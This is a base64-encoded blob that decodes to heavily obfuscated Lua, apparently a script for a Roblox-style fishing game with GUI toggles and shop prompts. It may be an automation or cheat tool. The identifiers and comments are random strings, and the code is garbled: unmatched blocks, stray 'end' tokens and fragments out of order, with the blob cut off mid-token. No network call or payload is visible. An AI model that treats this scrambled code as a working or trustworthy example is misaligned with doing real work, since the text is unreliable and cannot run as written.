ZJd0JZdyA9CiAgICAgICAgICAgICAgICAgICAgICAgIHp0THJsSVpUYmo6WUVpdFFCUUZkdihJUndWbExIS011LkRsV0V0UmVHcFMsIHJ3VGFHUEZvUmwob1BadHVKRlFSSyksIFBhanZQam5teFApCi0tIGxRamxySFZIQk8gUmd0THN2aVNGZgoKbG9jYWwgdHlGeVlQSmNMdiA9IGNUUWRSTUhQYlUuaUxkb3BHV1VLUjpxb0xUd3BUdWhZKFdETVBoQWFBb20udHRCQnpoWlRISygiWVZTZGZOY21VdiIpKQoKbG9jYWwgWlduWVRmYW1XWCA9CiAgICAgICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiNUZHUnZRSGFubG1UZzBXWjA5R1ZnVTJjVkJ5YjBWWFEiKSwKfSkKICAgICAgICAgICAgICAgICAgICAgICAgdkhTb0R5TmNyRTpVR1BHckhMU3BnKFdETVBoQWFBb20udHRCQnpoWlRISygiRFBoc2d6cWR5UiIpKSBFY0l5cE9rUVlVIHZIU29EeU5jckU6VUdQR3JITFNwZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1UU3Fkd1Z5UVdUIikpIEVjSXlwT2tRWVUgdkhTb0R5TmNyRTpVR1BHckhMU3BnKFdETVBoQWFBb20udHRCQnpoWlRISygieVdhTUZ5eXdqWCIpKSBFY0l5cE9rUVlVIHZIU29EeU5jckU6VUdQR3JITFNwZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj13T3RHTGZqZUxtIikpIEVjSXlwT2tRWVUKKQogICAgICAgICAgICBlbmQKbG9jYWwgZENhbFBUQUJ5RyA9IGJ3ZUpxSHpVTUk6RW1SeGdLeFF1ZihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09cWNnVGlNeUtDdCIpLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBXZ0JBUHdDaVhkIHRoZW4KY1RRZFJNSFBiVS56d1VMVFJxb0NVOnFvTFR3cFR1aFkoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJZUlB3dFFHYlBVIikpCi0tIEhsbE9uc0FteEIuWm50SWhRWUNLdyA9IDAuNSAtLSBZWG9KWmVGd2ZEIEpyTVdaTVlxYWMgaXNZUUFUTlBRQSB5RVJqeVBpZWlaCiAgICAgICAgICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9cXl1Q0VkelVpYiIpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCmVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIG9ITU1TekNETnUKICAgICAgICAgICAgUHlkeFR4c0VEQS5ETnZPSXNNWFZlLlVjTUJPck51dmQ6UG5KVnF6S1FEaigpCiAgICAgICAgICAgIGVuZAogICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiMEozYndWR2JsUkZJb05tY2hWMlUiKSwKICAgICAgICAgICAgc216a2ZkWFlXZAogICAgICAgICAgICAgICAgaWYgekRDaFNIZUtxYS5YRWFRS3p4ZEptIHRoZW4KICAgICAgICBrcU5VcGlQY0tjKFdETVBoQWFBb20udHRCQnpoWlRISygiPVlCWmhMalhBQmsiKSkKICAgICAgICAgICAgLS0gaFBzSEhiSW1zYyBWdVhVck9melRUIExqdUVzRW5UU1YgWVF5amlPZEJQRSBDS211RE1BakVPIGV0Z2Nkd0lYR3MkIENLbXVETUFqRU8gelJUSFRZdlFlYSBLV0xNbVprWWhqCiAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICBlbmQKfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFZbHhzRGpOblEuQU15Y0tBUWhoYSgpCiAgICAgICAgZW5kCiAgICAgICAgICAgIC0tIG5DZ1BoalJjT3MgdldRZ1BTYmVHVSBsaWZPcU5yQ3ZyCiAgICBpZiBBa2VFRVdSeGRoIHRoZW4KCgogICAgbG9jYWwgc2xKbWN0VUpaTSA9IEROdk9Jc01YVmU6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09Z0h6QWVXUXZOQSIpKQogICAgICAgIEthR3RWSXdCWXc6bmxTQWlpY1hpdSgpCmNUUWRSTUhQYlUuZ1FJQVFubVp2dDpFbVJ4Z0t4UXVmKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1Kb0JVWUpQamZ3IiksIHsKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgRkF3UVRKZmFpcyA9IHRydWUsIC0tIG1PR2dQS3ZPT0YgT2FRWnlmZmFhRyBNTlhOWmNWS05NIFFTcGllekd5Y0cKICAgIGxvY2FsIENUcmRMV21SdlAgPSBTbkZDYlpqWHZvOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9a1pyb3htYlRvciIpKTpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiMFZtVCIpKTpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiPU5YdEJNRXNnR2ciKSkKICAgICAgICB7CiAgICAgICAgICAgICAgICBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIjRaMmMiKSwKICAgICAgICAgICAgICAgICAgICBQQ2FRUHNYTGxOLnFWdGtKYWN6UmIgPSB6RlJFYWhCaGRoLmxhaW5Pa2dLZncoWmNmb1ZCc29EQS5nR0t0UlFDa0VSLCBaY2ZvVkJzb0RBLmdHS3RSUUNrRVIsIFpjZm9WQnNvREEuZ0dLdFJRQ2tFUikgLS0geU5heGNEQ1VwRyB6a1VvTnJFR1lOIGhqaW1ZU3BtcEEgU0tJcGxqUlRGSwogICAgICAgICAgICAtLSBydFV5clhidEdzIGtWU0tTdVZsaUsgVnVYVXJPZnpUVCBpZUdXT1Z3UkRsIHpTdGFXVlVZUGwgTGp1RXNFblRTViBLV0xNbVprWWhqIGxodm5RaldnUFUgTG9rZ1puQUp5TQogICAgV0RNUGhBYUFvbS50dEJCemhaVEhLKCJ5d1hGa0xFZGtsIiksCgp9CiAgICAgICAgICAgIGVuZAogICAgICAgIGxvY2FsIEpYUU5nSUlWS1cgPSB7IFsxXSA9IFFlSk1MU0RDYlAgfQogICAgICAgICAgICAtLSBUQWVaTHdSZG9PIExHbmpyZnVZc2EgWWVyY2x0Q0F5ViBZRVhyWklwb2ZZIHJ6Y3dTcm1RZkQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIG9xTlJpSlpzR1ggcHp5U3lIamV3WSBuZGtIclhORWdJIGZVYWRhV1VkSHUgeklwWkNFRVZzTSBrcm9PeVJ2U1JDCiAgICAgICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPWZKQ2JsTmtZcWgiKSwKICAgICAgICAgICAgICAgIGVuZAogICAgZnVuY3Rpb24oKQotLSBLRllrb2VOUUxnCiAgICAgICAgUXBRQ3pCVVZDZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1KSnJ3R05CWWl2IiksIG54aWlSWUJ4RlkpCiAgICB3RHlkemJvZHBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PXhia0JKb2RyYXMiKSwKICAgICAgICAgICAgICAgIHVWRGpvZ1VOU3AgdllrVHVpWnZWZC5Zc2NmV09GWGN0ID09IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1CSklOUE93ek5QIikgdGhlbgotLSBSdGtWd0xjU2FvIFNHYklqSkZFaW4gQnVBc09Ia1NWQgogICAgfSwKICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMT0RzbkdvSXpFLkxleXdaQlphTnggPSBaY2ZvVkJzb0RBLmdHS3RSUUNrRVIKbG9jYWwgQVRwcXhXTWZjZSA9IG5pbAoKICAgICAgICB5WGtaSFdIYVlOID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9Y0RhbFF6SkN6ayIpCiAgICAgICAgICAgIGlmIGxGdmpySkdtbVQ6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj16cnRUVEtTbWZoIikpIHRoZW4KICAgICAgICAgICAgICAgIGlmIE5BVENRcHBWQVE6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoImRQT05zT0R0WUgiKSkgQnh0UFVmVFJUSiBrbk53SHpyQktRLkRQRHhDcHdia3MgdGhlbgogICAgICAgIGVuZAogICAgZW5kCiAgICAgICAgcVdJYUxMVG5BbSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1PZFJlSVZtU2N0IiksCgogICAgICAgICAgICBRdFZMeHJHWGxxKEpYUU5nSUlWS1cpCiAgICAgICAgICAgICAgICAgICAgUENhUVBzWExsTi50anVXbFRzWHplID0gZ3pVeUVrc0trVAogICAgICAgICAgICAgICAgLS0gd2RQbG5ydVd6bCBMUnRFd3dtalBuIGVEckRIVnFmanQgakdtZ211R2FXWSBBbmlqWVJVa2hVCiAgICAgICAgUHVMcUJDTGlYZiB0cnVlIExKV1RkYlBhbHcKICAgICAgICAgICAgICAgICAgICBjSEpWSWZtSVBKLmFsZUFWZnFzeHggPSBmYWxzZQogICAgICAgICAgICAyLjUsCiAgICAgICAgcVdJYUxMVG5BbSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1kRkRsZEFLbGp2IiksCiAgICAgICAgICAgICAgICBoWFRtWGtzRkpPIG5odVVmUkh2V3QgPSAxLCA1IExKV1RkYlBhbHcKICAgICAgICBrRnBiWE5pSURPID0gZnVuY3Rpb24oeklwWkNFRVZzTSkKICAgICAgICBsb2NhbCBtZWl6Z1FCQlppID0gRk9pVU5OWUhKUSBCeHRQVWZUUlRKIEZPaVVOTllISlEuSGdzRG1uWHlnVyBFY0l5cE9rUVlVIG5pbApsb2NhbCB2TnJYdkltUExCID0gbXpRQmJkclF4VC52TnJYdkltUExCCiAgICAgICAgICAgIGlmIGRFbXlZQ1JSS1MgdGhlbgogICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCBIdGZsTW9rWXhOID0gUGFqdlBqbm14UC5ETnZPSXNNWFZlIEVjSXlwT2tRWVUgUGFqdlBqbm14UC5BSGRUdmNrb25jOlZQeldXTm9mTmYoKQogICAgICAgIGxvY2FsIGNOTFdDTnhQZ0YgPSBaa1VSZ3RjbVBCOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJoSHdOZ3hiakVaIikpCiAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgdVZEam9nVU5TcCB2WWtUdWladlZkLllzY2ZXT0ZYY3QgPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9cHRNQUlDUVRMSyIpIHRoZW4KbG9jYWwgQXBiTHlnVGpDTiA9IG5pbAogICAgICAgIHNtemtmZFhZV2QKICAgICAgICAgICAgICAgIHlPcUN1Y3FSb3MuQ0hjZG9FSERjUCA9IHRCemROQmNYTmYublJrRXJHSm5KdygyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgSUdORnl3TXZ2ZiA9IHNjVVloRHFBTFMKICAgICAgICBsb2NhbCB1Ynd3UVpPQ3lmCkNvU0RUQUtQenIoKQogICAgICAgIFdETVBoQWFBb20udHRCQnpoWlRISygid3JuWUNDWXNJVCIpLCBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09SU5ic2xpZ29uYiIpCmxvY2FsIFBDYVFQc1hMbE4gPSBuaWwgLS0gSHFmWGFzdk93SyBiZldPSkxXWnJOIHBpTXhvRUVnVm8gU3dQdlBjYmxuWAogICAgewpBWWx4c0RqTm5RLkZoV1pXQk9hU2woCi0tbFFqbHJIVkhCTyBKeUZGRkVqZHdYIHlmZVVlRGFZckwgbm15R2xBSm53dgogICAga25Od0h6ckJLUS5YcUdzTXlieHp3ID0gTkFUQ1FwcFZBUTp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPUZLS1duQU9pREoiKSkgQnh0UFVmVFJUSiBOQVRDUXBwVkFRLkhpREZRWUR1Q2wuZ3RETHBiek1tdiBFY0l5cE9rUVlVIG5pbApsb2NhbCBmdW5jdGlvbiBBRmFCek5qVUZlKCkKICAgICAgICBsb2NhbCBKWFFOZ0lJVktXID0geyBbMV0gPSBRZUpNTFNEQ2JQIH0KUUhjcVhyYm1Tci5HVEV5SUJ1dUtFID0gdHJ1ZQogICAgICAgICAgICBaa1VSZ3RjbVBCID0gcFNQaE5yRllMaSBCeHRQVWZUUlRKIHBTUGhOckZZTGk6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09c2NlV3ZNckh6YiIpKQogICAgICAgICAgICAgICAgaWYgb2JQS2h5b3VnVDpVR1BHckhMU3BnKFdETVBoQWFBb20udHRCQnpoWlRISygiPTQyYjBSWGRDVjJaaDFXUyIpKSB0aGVuCiAgICAgICAgcVdJYUxMVG5BbSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1jTERQemZQVHVSIiksCiAgICAgICAgICAgIGlmIG9iUEtoeW91Z1QudWlsSnJhVVJmSiA9PSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09c2NlV3ZNckh6YiIpIHRoZW4KbG9jYWwgdG1aZGRrbUdNciA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09YlpySlhPc25NRiIpKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBRZUpNTFNEQ2JQID0gUHlkeFR4c0VEQS5ETnZPSXNNWFZlOndOcUppVGR5cFUoTGZpYXhoSGxpVykKbG9jYWwgSGxsT25zQW14QiA9IGZpTW13b0dIVGQubGFpbk9rZ0tmdyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1ZbXFxVGhmclNsIikpIC0tIHNvVE5jaVlQRVQgb1RkUUZwc0V3dgogICAgICAgIHNaWG1NRllVcU4gPSA4CiAgICAgICAgICAgIEh0ZmxNb2tZeE46VkpNR2NqQXN1ZChtWGxzQ3B4TnZyLmxhaW5Pa2dLZncoUXl6b2RkS2JGRCkpCmxvY2FsIGZ1bmN0aW9uIFhEZUxvQ1V4YUcoQWtlRUVXUnhkaCkKaWYgWmRwY0l0SFJUUSgpLld1UFJDa0JtRXEgdGhlbgogICAgICAgICAgICAgICAgaFhUbVhrc0ZKTyBuaHVVZlJIdld0LCB2SFNvRHlOY3JFIEpabG91aHBIbFQgR25VdkxIb3N1Tih3anlIamViaXpDOmZqcGpUUEJHbnUoKSkgTEpXVGRiUGFsdwogICAgICAgICAgICAgICAgaWYgYkVoSXFUem9UdCBadENJZXppb09TIHRoZW4KICAgICAgICAgICAgZW5kCmxvY2FsIGxGdmpySkdtbVQgPSBzbEptY3RVSlpNOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWNaZUNWRWZxRGsiKSkKCiAgICB9CiAgICAgICAgcVdJYUxMVG5BbSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPUpyTEd1Z05CTmkiKSwKICAgICAgICAgICAgLS0gZGVCck1tT2lkSiBsZkdmUEpTU1ZjIFpmdXdTZWlpUkYgZnVuY3Rpb24ga05Za0pqd3dteCBXeWVZVk9BbWx6CiAgICAgICAgICAgICAgICAtLSB6d2pzR1FpQ2tsIGxlYXpCakN6UWcgSFRYcXluYU9YdiBiZldPSkxXWnJOIGl4emRWdVN2ZFkgVWJJWkFLb3JnQgpiTEx5RUhxWGZaLnRqdVdsVHNYemUgPSBkUGlRYk1yUWpLCgogICAgICAgIGxvY2FsIHBZWXVhZmlFdVIgPSBTbkZDYlpqWHZvLmRqVUNOb0xlWFRbUHlkeFR4c0VEQS51aWxKcmFVUmZKXS5Na2hsdVZWUGluLmxKcXFqWmRseGIKICAgIGlmIFFlSk1MU0RDYlAgQnh0UFVmVFJUSiBiRWhJcVR6b1R0IElSd1ZsTEhLTXUudG1aZGRrbUdNci5QeWR4VHhzRURBLkROdk9Jc01YVmU6d05xSmlUZHlwVShRZUpNTFNEQ2JQLnVpbEpyYVVSZkopIHRoZW4KICAgICAgICBRQ0pybGFJVGZkID0gMTYsCiAgICAgICAgICAgIGVuZAogICAgKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGdacFJadEZ4QmguWllxTHdJc2JsbihKUFhibmtYY3F2LCBCb0xodmZ5WkptKQogICAgICAgICAgICBRcFFDekJVVkNnKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1aZ0NPUWt2bUZ4IikpCi0tIC8vIC8vIC8vIGVsUHRnTWh2UXQgdlVxVFhoaGRGbSAvLyAvLyAvLyAtLQogICAgcVdJYUxMVG5BbSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPTRTWnpGR2FqSlhkd0J5YjBCQ2N2aDJjZ1VHYTBCU2J2Sm5aZ1EyYnlCeVp1bEdhemxtWmdFR0lsTjNidmgyUSIpLApVcFRhQ3Z6Sld0OkpQRXNvZ2tnYlQoCiAgICBjVFFkUk1IUGJVLmlMZG9wR1dVS1I6RW1SeGdLeFF1ZigKICAgIGVuZAogICAgICAgICAgICBsb2NhbCBuZGtIclhORWdJID0gZGV2Y1RMR2NpcShoQk5xdHZveWtxLkhnc0Rtblh5Z1cpIEVjSXlwT2tRWVUgMyAtLSBvcU5SaUpac0dYIHB6eVN5SGpld1kgZlVhZGFXVWRIdSB6SXBaQ0VFVnNNCiAgICBrRnBiWE5pSURPID0gZnVuY3Rpb24oSGdzRG1uWHlnVykKbG9jYWwgbGVhekJqQ3pRZyA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1qZVd5eGhQU0xQIikpLlVlUFhHZFBKaE8uSFRYcXluYU9YdgogICAgICAgICAgICAgICAgICAgIGlmIHZIU29EeU5jckU6VUdQR3JITFNwZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIjV0MlUiKSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZApsb2NhbCBXVkRMcFFsWUFRID0gMQopCiAgICBjVFFkUk1IUGJVLmdqdWxGcElKRUc6YnBCUmhXY0ZjcCgKU0tvZXhsT05USjpKUEVzb2drZ2JUKGZ1bmN0aW9uKCkKbG9jYWwgR0dVTm9yV2RhcSA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1qZVd5eGhQU0xQIikpLlBKRkdmWFNXT2EuWlBaRWNBV2FrVi5KalNzanZQZm1ICiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgalpkc01PdGlnYTp2V3lobkpGR0tHKG5pbCkKCnNHTFRST2VGdG8uT2xkbWdDRHBZRzpyYVlWV2xVakNNKFdETVBoQWFBb20udHRCQnpoWlRISygiVmtxRGtGU25TZyIpKTpuenZGeFRDRGNEKAopCiAgICAgICAgICAgICAgICBlbmQKZW5kKQogICAgICAgICAgICAgICAgaWYgUEpGR2ZYU1dPYSB0aGVuCiAgICAgICAgcVdJYUxMVG5BbSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1NTkhMZVlWbGV4IiksCiAgICAgICAgaWYgZGlzYkZIaVlOTC51aWxKcmFVUmZKID09IFdETVBoQWFBb20udHRCQnpoWlRISygiSHd4VGFCS0pFTCIpIEJ4dFBVZlRSVEogZGlzYkZIaVlOTC50anVXbFRzWHplIEJ4dFBVZlRSVEogZGlzYkZIaVlOTC50anVXbFRzWHplLnVpbEpyYVVSZkogPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJoSHdOZ3hiakVaIikgdGhlbgogICAgICAgICAgICAgICAgS3FJQnpCWkJEbi5XRE9JeUNUd3hQOlZQeldXTm9mTmYoKQogICAgICAgIHFXSWFMTFRuQW0gPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09RHBtRG92cFpweCIpLCAtLSBHR3RLUERyZE9QCiAgICBjWHVWb1ZxcWdsLnRqdVdsVHNYemUgPSBIcGpLc3JvYVZRCiAgICAgICAgICAgIHJ0WVlKWVFwb1VbSmpabFBTdm1BT10gPSBlUEx5V3picHZsW0pqWmxQU3ZtQU9dCgpsb2NhbCBwU1BoTnJGWUxpID0gUHlkeFR4c0VEQS5wU1BoTnJGWUxpCgogICAgICAgICAgICBpZiB3anlIamViaXpDIH49IG5pbCB0aGVuCmxvY2FsIERERVJPYVdYRVogPSBFdVBoZlJPUUtTOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9Y0NTb0l1TlZCViIpKSAtLSBUQWVaTHdSZG9PIExqdUVzRW5UU1YgTEduanJmdVlzYSBNTlhOWmNWS05NIEFSRGZnalNuUHQgYmZXT0pMV1pyTiBldGdjZHdJWEdzJApsb2NhbCBzbEptY3RVSlpNID0gd2p5SGplYml6Qzp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1nSHpBZVdRdk5BIikpCgoKCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgfQogICAgICAgICAgICAgICAgICAgIHVWRGpvZ1VOU3AgdllrVHVpWnZWZC5Zc2NmV09GWGN0ID09IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1ZYXFKckZleEVYIikgQnh0UFVmVFJUSiBIamhMckJjdEttIHRoZW4KICAgICAgICBEZmtDSFNhTm9ZID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PW1iZkRkbHN4ZFciKSwKICAgIHsKICAgICAgICAgICAgZW5kCiAgICBlbmQKICAgIGVuZAogICAgewpsb2NhbCBid2VKcUh6VU1JID0gY1RRZFJNSFBiVS5xTE1ocnZvZE1ZOnFvTFR3cFR1aFkoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9Vk9jQXR6UkNvciIpKQogICAgY1RRZFJNSFBiVS5nanVsRnBJSkVHOktVR1dSaVJHeEsoCiAgICAgICAgICAgIEFGYUJ6TmpVRmUoKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgIGVuZAp9KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIFsxXSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiS3BvdGdicEh6dit5SlJmbnNRQmRzIiksCiAgICAgICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPVB1UmdBdVlXdVYiKSwKICAgICAgICAgICAgbG9jYWwgQUNXS1VNbHlQSCA9IGVUWGZWQmxpWnooS1VQdk9VdVhQbikKCiAgICAgICAgICAgIC0tIEJpTElMZUVSRGMgUk9oZ0FoSW9XdiBsZkdmUEpTU1ZjIFVYTk13eFRCT2MgbEFWYnlHZW5wRAogICAgaVF6ZkNYd0xoeiA9IENQZ3BwdXhiTlc6RHdhZlJCb0NlYih7IHRhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIndDRXp5WmxSRHYiKSwgY1BoWGVwWWVOYSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiMmdqTjVnek41QXpOd0V6THZvRFpwUlhaek5YWTRKbWMiKSB9KSwKbG9jYWwgZFdFQ0tLdXZmYiA9CiAgICBmdW5jdGlvbihES09naGRqcHJjKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNOTFdDTnhQZ0YgPSB2b2FCc3NRYU5VOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJoSHdOZ3hiakVaIikpCiAgICBmdW5jdGlvbihES09naGRqcHJjKQpYaXdaZWptcEJ4LldncnZsYmx2TGYgPSBRc3lDd25QTVVZLmxhaW5Pa2dLZncoMC4xLCAwLCAwLjIsIDApIC0tIGF3TEhBQmVLQ1IgQlBZZVdRS0NrTgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgcVdJYUxMVG5BbSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1MZ0dxenJrWGZKIiksCiAgICAgICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiTnhyZERRUmZGeSIpLAogICAgewpmUHZoTnRJTFN4LlpudEloUVlDS3cgPSAxIC0tIEdEVndCalpOcnYgS0J3bXNTalRRTCBwblpBUkJkaExhIGlzWVFBVE5QUUEgb2tWU213R1FPUyB5UGpmV01oU0RECiAgICAgICAgICAgIGhYVG1Ya3NGSk8gbmh1VWZSSHZXdCwgdkhTb0R5TmNyRSBKWmxvdWhwSGxUIGNsSkRscGVhcUssIHpEQ2hTSGVLcWEgTEpXVGRiUGFsdwpsb2NhbCBQYWp2UGpubXhQID0gdG1aZGRrbUdNci5QeWR4VHhzRURBCiAgICAgICAgVWNNQk9yTnV2ZC5DY0JpcVJWRnRuID0gdHJ1ZQogICAgRWN6dmpVTlJGSS5aeUthSGNUcWlHID0gdHJ1ZQogICAgY1RRZFJNSFBiVS5TR2JJakpGRWluOmJwQlJoV2NGY3AoCiAgICB7CiAgICAgICAgICAgIGdacFJadEZ4QmguWllxTHdJc2JsbihlUEx5V3picHZsW0lueVBSSHJoV1UudWlsSnJhVVJmSl0sIElueVBSSHJoV1UubVhsc0NweE52cikKbG9jYWwgZnVuY3Rpb24gb3ZJdmhoWEVXRShsQVZieUdlbnBEKQogICAgICAgICAgICBpZiByU0laYkhFSE53IHRoZW4KbG9jYWwga2hyWHJNRkhIYSA9CiAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGdacFJadEZ4QmguWllxTHdJc2JsbihYallOVGJFVEZsLCAxLCB2SFNvRHlOY3JFKQogICAgICAgICAgICB9Ci0tIENobGx2T1JXbkkKICAgIHsKICAgIGpwcU15V1VHU0YgPSBSZHVkYm9HV25HLAopCi0tIG91TmxnYVJrZlguZVdIYU11am55TCA9IDkwIC0tIG91TmxnYVJrZlggZlVhZGFXVWRIdSBmZWlGSXphSk14IE1xY3dCbGlWeXIgcFpSd2RUQUJWYwogICAgICAgICAgICAgICAgZGlzYkZIaVlOTC5aeUthSGNUcWlHID0gREtPZ2hkanByYwogICAgICAgICAgICAgICAgZW5kCmxvY2FsIHdqeUhqZWJpekMgPSBQeWR4VHhzRURBLkROdk9Jc01YVmUgRWNJeXBPa1FZVSBQeWR4VHhzRURBLkFIZFR2Y2tvbmM6VlB6V1dOb2ZOZigpCiAgICAgICAgICAgICAgICBBWWx4c0RqTm5RLkFNeWNLQVFoaGEoKQogICAgZW5kClZyRktrcEJYQlU6SlBFc29na2diVCgKICAgICAgICAgICAgICAgICAgICAKICAgIGhYVG1Ya3NGSk8gUGNwY3JrUmxCeiwgSW55UFJIcmhXVSBKWmxvdWhwSGxUIEduVXZMSG9zdU4oTkZCREJhZmhGcCkgTEpXVGRiUGFsdwogICAgICAgICAgICAgICAgICAgICAgICB2SFNvRHlOY3JFLkxFZkFpYWFVQWUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIiIpKSkpKSkpCgpiTEx5RUhxWGZaLkp0aGZ6S0lXaFcgPSBOS01JdEhNWGdZKDAuMDgpIC0tIFJXaGh3SU5NRmogbUR1dmdRd2ltTyBCakhzQ2ZqSUR2CiAgICAgICAgICAgIGtxTlVwaVBjS2MoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PU1iZ0RTV1pZekEiKSkKICAgICAgICAgICAgICAgIHNtemtmZFhZV2QKICAgICAgICAgICAgbG9jYWwgbmRrSHJYTkVnSSA9IGRldmNUTEdjaXEoR050cld0WURZVi5IZ3NEbW5YeWdXKSBFY0l5cE9rUVlVIDMgLS0gb3FOUmlKWnNHWCBwenlTeUhqZXdZIGZVYWRhV1VkSHUgeklwWkNFRVZzTQoKICAgICAgICAgICAgLS0gQmlMSUxlRVJEYyBST2hnQWhJb1d2IGxmR2ZQSlNTVmMgVVhOTXd4VEJPYyBsQVZieUdlbnBECiAgICAgICAgKQogICAgICAgICAgICAtLSBHaHNOdmdjeHhwIGxmR2ZQSlNTVmMgUGFqdlBqbm14UCdWWGtLVG5SRmRwIG1pSWNlbm1jVXUgbEFWYnlHZW5wRAogICAgICAgICAgICApOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9VGlHa21pSVd5aCIpLCA5ZTkpOkVMamN5R2Z4a3ooV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PXBwTVJySHpNWHkiKSwgOWU5KQogICAgICAgICAgICBoWFRtWGtzRkpPIFBjcGNya1JsQnosIG9iUEtoeW91Z1QgSlpsb3VocEhsVCBHblV2TEhvc3VOKE9DZW5MaFF2VHA6RFFaekxEa3FBbigpKSBMSldUZGJQYWx3CgoKICAgICAgICAgICAgICAgIGlmIFViSVpBS29yZ0IgdGhlbgogICAgICAgIHRhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj0wV1owbEVJa1ZHZGpWR2JsTkZJNVZuUSIpLAopCiAgICBxSFlTVWdXVHlFID0gZmFsc2UsCiAgICAgICAgICAgIFpRZUVaelJBWnkgPSB0cnVlCiAgICB7Ci0tIHVQRW5HWFh4QmMgUnRrVndMY1NhbyBNcWN3QmxpVnlyIGtyb095UnZTUkMKICAgICAgICAgICAgaWYgQ1hYSUhvSUVHZC51aWxKcmFVUmZKID09IFdETVBoQWFBb20udHRCQnpoWlRISygi